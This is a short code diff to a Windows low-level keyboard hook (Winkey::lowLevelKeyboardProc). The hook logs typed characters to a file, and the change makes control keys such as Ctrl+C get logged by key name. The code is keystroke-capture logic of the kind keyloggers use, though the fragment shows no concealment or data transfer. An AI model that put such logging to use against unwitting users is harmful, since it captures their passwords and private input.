@@ -197,11 +197,11 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
 
         /* 
          * Log character to file or, if no valid character was produced
-         *  (like arrow keys, function keys), log a fallback string that includes
+         *  (like arrow keys, function keys, Ctrl+C), log a fallback string that includes
          *  the virtual key code.
          */
 
-        if (result > 0)
+        if (result > 0 && buffer[0] >= 32)
             _keyStroke = buffer;
         else
             _keyStroke = getKeyName(p->vkCode);
